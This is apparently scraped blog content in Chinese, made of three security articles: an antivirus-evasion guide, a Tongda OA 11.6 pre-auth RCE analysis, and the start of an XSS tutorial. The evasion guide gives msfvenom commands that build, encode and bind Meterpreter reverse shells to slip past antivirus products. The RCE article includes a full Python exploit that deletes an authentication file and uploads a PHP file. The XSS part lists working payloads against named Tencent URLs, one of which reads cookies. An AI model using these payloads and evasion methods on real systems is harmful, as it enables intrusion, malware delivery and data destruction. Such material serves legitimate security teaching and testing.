6、全盘扫描：扫描电脑全部磁盘，耗时较长。 7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。 8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序 监控技术 1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。 2、文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警。 3、邮件监控：当发现电子邮件的附件存在病毒时进行拦截。 4、网页防护：阻止网络攻击和不安全下载。 5、行为防护：提醒用户可疑的应用程序行为。 0x01 扫描引擎特征码扫描机制：将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。 特征码类别： 1.文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）； 2.内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码 优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。 缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦。 文件校验和法对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒。 进程行为监测法(沙盒模式)机制：通过对病毒多年的观察、研究，有一些行为是病毒的共同行为，而且比较特殊，在正常程序中，这些行为比较罕见。比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。当程序运行时，监视其进程的各种行为，如果发现了病毒行为，立即报警。 优缺点： 1.优点：可发现未知病毒、可相当准确地预报未知的多数病毒； 2.缺点：可能误报警、不能识别病毒名称、有一定实现难度、需要更多的用户参与判断； 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。 云查杀云查杀的特点基本也可以概括为特征查杀，杀软会将较可疑但特征库并没有响应特征的程序传回杀软公司服务器上，进而判断该程序是否为恶意程序，然后做出响应。所以当你开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了，这就是云查杀的效果。 主动防御技术主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作 主动防御本来想领先于病毒，让杀毒软件自己变成安全工程师来分析病毒，从而达到以不变应万变的境界。但是，计算机的智能总是在一系列的规则下诞生，而普通用户的技术水平达不到专业分析病毒的水平，两者之间的博弈需要主动防御来平衡。 机器学习识别技术机器学习识别技术既可以做静态样本的二进制分析，又可以运用在沙箱动态行为分析当中，是为内容/行为+算法模式。伴随着深度学习的急速发展，各家厂商也开始尝试运用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二进制恶意样本检测。 0x02免杀技术介绍修改特征码免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。 1特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串 就目前的反病毒技术来讲，更改特征码从而达到免杀的效果事实上包含着两种方式。 一种是改特征码，这也是免杀的最初方法。例如一个文件在某一个地址内有“灰鸽子上线成功！”这么一句话，表明它就是木马，只要将相应地址内的那句话改成别的就可以了，如果是无关痛痒的，直接将其删掉也未尝不可。 第二种是针对目前推出的校验和查杀技术提出的免杀思想，它的原理虽然仍是特征码，但是已经脱离纯粹意义上特征码的概念，不过万变不离其宗。其实校验和也是根据病毒文件中与众不同的区块计算出来的，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。所以如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。 修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。 花指令免杀花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。 大多数反病毒软件是靠特征码来判断文件是否有毒的，而为了提高精度，现在的特征码都是在一定偏移量限制之内的，否则会对反病毒软件的效率产生严重的影响！而在黑客们为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，自然也就无法正常检测木马了。 加壳免杀说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。 当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。 加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。 面对这种情况可以考虑用一些冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。 总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。 内存免杀CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。 因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。 因此，除了加壳外，黑客们对抗反病毒软件的基本思路没变。而对于加壳，只要加一个会混淆程序原有代码的“猛”壳，其实还是能躲过杀毒软件的查杀的。 二次编译metasploit的msfvenom提供了多种格式的payload和encoder，生成的shellcode也为二次加工提供了很大遍历，但是也被各大厂商盯得死死的。 而shikata_ga_nai是msf中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。 目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。 分离免杀侯亮大神和倾旋大神都分别提到过payload分离免杀和webshell分离免杀，采用分离法，即将ShellCode和加载器分离。网上各种加载器代码也有很多，各种语言实现的都很容易找到，虽然看起来比较简单，但效果却是不错的。比如侯亮大神提到的shellcode_launcher，加载c代码，基本没有能查杀的AV。 资源修改有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。 1.加资源 使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。 2.替换资源 使用ResHacker替换无用的资源（Version等）。 3.加签名 使用签名伪造工具，将正常软件的签名信息加入到自己软件中。 0x03 Metasploit自带免杀Metasploit自身已经提供了一定免杀机制，比如Evasion模块、MSF自带的C编译模块、大名鼎鼎的shikata_ga_nai编码等等，但由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果。 免杀测试主要是使用了metasploit或cobaltstrike生成的代码或程序进行免杀处理，在实验机(win7 x64)上安装了360全家桶和火绒进行本地测试，在https://www.virustotal.com/上进行在线查杀（如果是自己做免杀，建议测试机不要联互联网，更不要上传到virustotal.com类似的平台上）。 在开始实验之前，写了一篇文章介绍了一下msfvenom的基本参数和一些小技巧：https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w，里面基本介绍了msfvenom的所有常用参数，有些参数在msf使用中可能会有一些意想不到的效果。 原生态payload(VT查杀率53/69) 操作便利★★★★★ 免杀效果★ 推荐指数★★ 详细文章链接：https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA 在免杀之前，我先生成了一个原始payload作为原始样本做对比，选用了频率最高的windows/meterperter/reverse_tcp，这也是被各大杀软盯的最紧的一个，并以此做为其他免杀的对比衡量标准。 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe -o payload1.exe 经测试，可正常上线。在virustotal.com上查杀率为53/69。这种原生态的居然还有没查杀出来的，还好意思叫杀软么… msf自编码免杀(VT查杀率51/69) 操作便利★★★★★ 免杀效果★ 推荐指数★★ 详细文章链接：https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA metasploit提供了多个encoders可以对payload进行处理，使用msfvenom –list encoders可查看所有编码器。 评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器了。 生成示例： 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -i 15 -f exe -o payload2.exe 经测试，可正常上线。在virustotal.com上查杀率为51/69。 由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。 msf自捆绑免杀(VT查杀率39/69) 操作便利★★★★ 免杀效果★★ 推荐指数★★ 详细文章链接：https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA 在生成payload时可以使用捆绑功能，使用msfvenom的-x参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，-x后面跟对应文件路径就可以。 我这里使用一个正规的putty.exe作为被捆绑测试软件。 生成payload命令如下 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -x putty.exe -f exe -o payload3.exe 测试机器运行，本地的360全家桶和火绒都能查杀该payload。 在virustotal.com上查杀率为39/69 另外，能否免杀也和你选的被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。 msf自捆绑+编码(VT查杀率35/69) 操作便利★★★★ 免杀效果★★ 推荐指数★★ 详细文章链接：https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA 将上面的编码和捆绑两种方法结合一下进行尝试 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o payload4.exe 测试机器执行，发现火绒动态静态均能查杀，而360不会报病毒。 在关闭火绒后，开启360安全卫士和杀毒的情况下，可上线，可免杀。 可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。 在virustotal.com上查杀率为35/69 看来稍微组合一下是能过更多的杀软的。后面会介绍更多的免杀方法，自己可以尝试多种免杀进行组合，垒积木一样的感觉… msfvenom多重编码(VT查杀率45/70) 操作便利★★★★ 免杀效果★★ 推荐指数★ 详细文章链接：https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。 如下命令，使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码20次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以putty.exe为模板的可执行文件。 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe 还有这种更多重编码姿势 1msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; payload6.exe 在virustotal.com上查杀率为45/70，编码多了，免杀率居然降低了。。。尴尬。。。 经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。 Evasion模块免杀(VT免杀率12-71) 操作便利★★★ 免杀效果★★★ 推荐指数★★★ 详细文章链接：https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ 2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。 evasion有以下几个模块,可以使用show evasion进行查看。 使用use windows/windows_defender_exe进行生成payload 123456msf5 &gt; use windows/windows_defender_exemsf5 evasion(windows/windows_defender_exe) &gt; set filename payload.exemsf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_exe) &gt; set LHOST 10.211.55.3msf5 evasion(windows/windows_defender_exe) &gt; set LPORT 3333msf5 evasion(windows/windows_defender_exe) &gt; run 经测试，可正常上线。virustotal.com中42/71个报毒。 还可以生成install_util(VT查杀率12/71)和hta(VT查杀率14/59)等，因为使用了白名单加载的方式，所以免杀效果相对好一些。 msf自编译+base64处理(VT免杀率33/69) 操作便利★★ 免杀效果★★★ 推荐指数★★★ 详细文章链接：https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg Metasploit Framework提供了C编译器，这其实是Metasm的包装器(Metasm是一个Ruby库)，可用于汇编、反汇编和编译C代码。 使用改C编译器时，需要以下两个函数： 123Metasploit::Framework::Compiler::Windows.compile_c(code)Metasploit::Framework::Compiler::Windows.compile_c_to_fle(fle_path, code) 操作略微复杂，详细过程可以参看https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg。 最终生成的payloaf在virustotal.com中33/70个报毒 使用reverse_https(VT免杀率29/70) 操作便利★★ 免杀效果★★★ 推荐指数★★★ 详细文章链接：https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg 主要是参考Green_m的文章:https://www.freebuf.com/sectool/118714.html，可以一定程度的避开杀软的流量检测。 使用msfvenom生成payload 1msfvenom -p windows/meterpreter/reverse_https lhost=10.211.55.2 lport=3333 -f exe -o payload1.exe 在VC中编译后执行，360全免杀 virustotal.com中29/70个报毒 使用reverse_tcp_rc4(VT免杀率33/70) 操作便利★★ 免杀效果★★★ 推荐指数★★★ 详细文章链接：https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg 和上面的方法一样，使用reverse_tcp_rc4也有同样的效果，而且不用设置stageencoder选项，更稳定更方便。 1msfvenom -p windows/meterpreter/reverse_tcp_rc4 lhost=10.211.55.2 lport=2223 rc4password=tidesec -f c 利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。 在VC中编译后执行，360全免杀，但是一会儿之后就又被查杀了。 virustotal.com中33/70个报毒 参考 很多内容参考了wiki百科和freebuf上Green_m和Anhkgg两位大佬的文章，在此表示感谢！想深入了解的可在访问下面链接。 免杀技术有一套:https://anhkgg.com/aanti-virus/ Meterpreter免杀及对抗分析:https://www.freebuf.com/sectool/157122.html 免杀艺术:https://www.4hou.com/technology/3853.html Meterpreter免杀技巧分享:https://www.freebuf.com/sectool/118714.html msf_wiki: https://github.com/rapid7/metasploit-framework/wiki Create a wrapper for metasm’s C compiling function:https://github.com/rapid7/metasploit-framework/pull/10007 How to decode Base64 with Metasploit Framework Compiler: https://github.com/rapid7/metasploit-framework/wiki/How-to-decode-Base64-with-Metasploit-Framework-Compiler 使用msf编码器避开杀毒软件的检测：https://www.freebuf.com/column/216599.html msf多重编码:https://blog.csdn.net/wyf12138/article/details/79825833 Msfvenom学习总结:http://www.secist.com/archives/3353.html msfvenom生成后门的免杀测试：http://www.naivete.online/msfvenom%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E7%9A%84%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95/ 转自：https://www.freebuf.com/articles/system/227461.html","link":"/2020/09/12/web%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/"},{"title":"通达OA11.6 preAuth RCE分析","text":"该漏洞需要结合任意文件删除以及文件上传漏洞进行配合 任意文件删除漏洞首先漏洞是在/module/appbuilder/assets/print.php 能将传入的guid传入的文件删除 身份绕过删文件某些时候可以删除一些认证的文件，进行文件的绕过 这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？ 这里就要看php里面include和require的区别了 这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。 如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。 而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去! 因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！ 其中的代码验证SESSION判断是否登录 变量覆盖和任意文件上传这里我们看到general/data_center/utils/upload.php 这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量 （没找到大佬说的位置） 可以尝试使用变量覆盖 漏洞点在图中最后一个else $repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去） POC如下： 1本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测/module/appbuilder/assets/print.php是否存在 import requeststarget=&quot;http://127.0.0.1:8203/&quot;payload=&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;requests.get(url=url)print(&quot;[*]Checking if file deleted...&quot;)url=target+&quot;/inc/auth.inc.php&quot;page=requests.get(url=url).textif 'No input file specified.' not in page: print(&quot;[-]Failed to deleted auth.inc.php&quot;) exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;files = {'FILE1': ('hack.php', payload)}requests.post(url=url,files=files)url=target+&quot;/_hack.php&quot;page=requests.get(url=url).textif 'No input file specified.' not in page: print(&quot;[+]Filed Uploaded Successfully&quot;) print(&quot;[+]URL:&quot;,url)else: print(&quot;[-]Failed to upload file&quot;)","link":"/2020/09/09/web%E6%B8%97%E9%80%8F/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/"},{"title":"那些年我们一起学XSS","text":"1. 什么都没过滤的入门情况 来源：1. 什么都没过滤的入门情况 简要描述只是些反射型 XSS，单单发出来没有什么意义。 只是些反射型 XSS，腾讯怎么修都修不完。 只是些反射型 XSS，我想让它变得更有价值。 只是些反射型 XSS，我拿他们做成了教程。 详细说明 XSS 的存在，一定是伴随着输入，与输出 2 个概念的。 要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。 如果输入和输出都没过滤。 那么漏洞将是显而易见的。 作为第一个最基础的例子， 我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤&lt; , &gt;）的例子。 这种例子出现在 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。 5. 1http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=1&amp;func=haoping&amp;_=1353475261886 对于上面这个例子。我们可以看到什么是输入，什么是输出。 经过测试，我们发现，score 这个【输入】参数，没有进行任何过滤，即，输入是什么，输出就是什么？ 通俗点就是“吃什么，拉什么”。。。 如下图： 网页中看到的效果如下： \\8. 既然可以直接输入 &lt; &gt; HTML 标签，接下来的利用也就相对简单了。 1http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=&lt;img src=1 onerror=alert(1);&gt;&amp;func=haoping&amp;_=1353475261886 效果如下： 修复方案123&lt;HTML 标签&gt;&lt;/HTML 标签&gt;[输出]&lt;HTML 标签&gt;&lt;/HTML 标签&gt; 或 1&lt;HTML 标签&gt;[输出]&lt;/HTML 标签&gt; a. 通常，我们只需要在输出前，将 &lt; , &gt; 过滤掉即可。 b. 这类 XSS 在小型网站中比较常见，在大型网站中少见。 c. 这类 XSS 通常都被浏览器的 XSS 过滤器秒杀了，所以一般来说，威力较小。 d. 对于普通用户来说，请使用 IE8 及以上版本（并开启 XSS 过滤器功能，默认开启），或 chrome 浏览器，将可以防御大部分此种类型 的 XSS 攻击 2. 输出在``之间的情况 2. 输出在``之间的情况 简要描述接着上面一个教程，我们继续。这个例子属于第一例的特殊情况，当然也有特殊解法。也属于非常常见的一种情况。 详细说明 我们找到这么一个点，也是输入和输出都未过滤的一个点。相比教程第一例，其特殊之处在于，是输出在了 [输出] 之间。 1http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa 如下图：callback 参数未做过滤。 在【查看源代码】下，我们可以看到。 缺陷网页源代码: 1&lt;script type='text/javascript'&gt;document.domain='soso.com';_ret={&quot;_res&quot;:2};try{parent.aaa(_ret);}catch(err){aaa(_ret);}&lt;/script&gt; 碰到这种情况，我们一般有以下解法。 2.1 首先判断，是否过滤了 &lt; , &gt; , / 等符号， 2.2 如果都没有过滤，恭喜你，一般可以直接 XSS 了。代码如下： 1http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; payload： 1aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 原理入下图： 构造 callback 参数后的源代码 1&lt;script type='text/javascript'&gt;document.domain='soso.com';_ret={&quot;_res&quot;:2};try{parent.aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;(_ret);}catch(err){aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;(_ret);}&lt;/script&gt; 2.3 如果过滤了 &lt;, &gt;，那么就无法使用上面的办法了。我们接着看 script 代码里的构造。 友情提示：这里可能需要一点点 javascript 的知识才行哦～～ 我们可以如下构造： 1http://activity.soso.com/common/setParentsInfo.php?callback=eval('alert(1)');void payload： 1eval('alert(1)');void 可以看到，源代码是下面的样子。 也就是说，我们插入的内容，使得这一段 javascript 依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的 JS 代码】， 这样我们的目的就达到了。 构造后的源代码如下： 1&lt;script type='text/javascript'&gt;document.domain='soso.com';_ret={&quot;_res&quot;:2};try{parent.eval('alert(1)');void(_ret);}catch(err){ eval('alert(1)');void(_ret);}&lt;/script&gt; 这种输出在 JS 代码里的情况十分常见，但是呢？不幸的是，像这样没过滤的情况，却不是很常见。例如： var a=&quot;[输出]&quot;; // 通常程序员会把 “ 过滤掉， 这样的话，一般来说，我们就很难构造。 但是，这并不是说，就一定是不能利用，后面我们会拿腾讯一些【比较有意思】的例子，来进一步说到 这个【输出在 js 里】的情况的～ 修复方案这类 XSS 的模型通常是： 12&lt;script&gt;...[输出]...&lt;/script&gt;&lt;style&gt;...[输出]...&lt;/script&gt; 解决方案： 过滤 `` 组合 针对输出在不同的场景，进行合适的过滤。 3. 输出在 HTML 属性里的情况 来源：3. 输出在 HTML 属性里的情况 简要描述和前面的不一样的时，有时候，输出会出现在 HTML 标签的属性之中。 例如： 、 ，再比如 `` .. 这个时候怎么办呢？ 详细说明 大网站一般不是吃素的。前面讲到的基本情况，一般都很少遇到了。 这个时候我们可以把目光发展一下，找一找在【输出】出现在 HTML 属性里的情况。 最为典型的一种情况，是下面这样的。 1http://xxxx.com/search.php?word=乌云欢迎您 HTML 代码里则是下面这样情况的。 1.. 关键词：&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; /&gt; 如果这里的 word 没过滤双引号。就会有以下的情况发生。 1http://xxxx.com/search.php?word=乌云欢迎您&quot; onclick=&quot;alert(1) 对应的源代码如下： 1&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt; 解析： 那么当用户点击这个文本框时，就会触发 alert(1) 。 当然理想是美好的，现实总是残酷的，我水平有限，并没有在腾讯找到这样的例子。 因为绝大部分这样的情况， 腾讯都会做出相应的过滤。 过滤方法也挺简单，将 &quot; 过滤为 &quot; 就行。 过滤后的代码如下： 1&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt; 一般来说，上面的情况，过滤了 &quot; ，可以说是高枕无忧了，但是事实并非如此。某些情况下。我们依然可以继续 XSS。下面以腾讯为例。 首先看第一种场景。 1http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=我是一个兵,爱国爱人民&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhiche n001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx 这里的 bg 参数过滤了【几乎】所有的东西。但是它输出在了 更重要的是，这里没有过滤 \\ ，反斜线， 而 css 里，允许使用转义字符, \\ + ascii 16 进制形式。这样一来，我们就可以构造利用语句啦。 这里过滤了 expression, 我们也可以轻松的用 expr\\65ssion 绕过。 1http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\\65ssion\\28%20eval\\28\\27\\69\\66\\28\\21\\7 7\\69\\6e\\64\\6f\\77\\2e\\78\\29\\7b\\61\\6c\\65\\72\\74\\28\\64\\6f\\63\\75\\6d\\65\\6e\\74\\2e\\63\\6f\\6f\\6b\\69\\65\\29\\3b\\77\\69\\6e\\64\\6f\\77\\2 e\\78\\3d\\31\\7d\\27\\29\\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qin gfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipeng tx 效果如下： 这种情况，遗憾之处在于，基于 css expression 的 XSS 已经进入暮年了，只有在 IE6，7 下方能触发，受众面小。这里只是作为一个案例来讲讲。 Tips: 至于这里的转义是如何写的：步骤如下： 例如 e 的 ascii 16 进制是 65, 我们就写为 \\65 expression -&gt; expr\\65ssion。 本例缺陷点代码： 1&lt;body style=&quot;overflow:auto;background-color:#我是一个兵，爱国爱人民;&quot;&gt; 再来看下一个在属性里的案例。这个例子也是比较常见的。比如： 12&lt;HTML 标签 onXXXX=&quot;...[输出在这里]..&quot;&gt; &lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt; 的例子。 正好，在腾讯的这个例子中，以上 2 个情况一起出现了。 我们以其中一种进行讲解。 1http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa 看输出，如下，aaaaaaaa 出现在了 2 个点。 常规来说，因为 onxxxx=&quot;[输出]&quot; 和 href=&quot;javascript:[输出]&quot; 与 [输出] 没有太大区别。因为[输出]所在的地方，都是 javascript 脚本。 但是[输出] 如果被过滤，往往没有太好的办法。 而上面这 2 种情况，则有一个很好的办法绕过过滤。 Tips: 在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。 1&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt; 和 1&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; 是等效的 换言之，只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符。 看看缺陷点的代码 1&lt;li&gt;&lt;input type=&quot;text&quot; id=&quot;pagenum&quot; class=&quot;inputstyle0814&quot; onkeydown=&quot;if ((event.keyCode==13) &amp;&amp; (this.value!='')) location.href='http://stock.finance.qq.com/report/search.php?offset='+this.value+'&amp;searchtype_yjbg=yjjg&amp;searchvalue_y jbg=aaaaaaaaaa'&quot;/&gt;&lt;/li&gt; JS 部分我们可以做以下构造,由于’被过滤，我们可以将’写为&amp;#27； 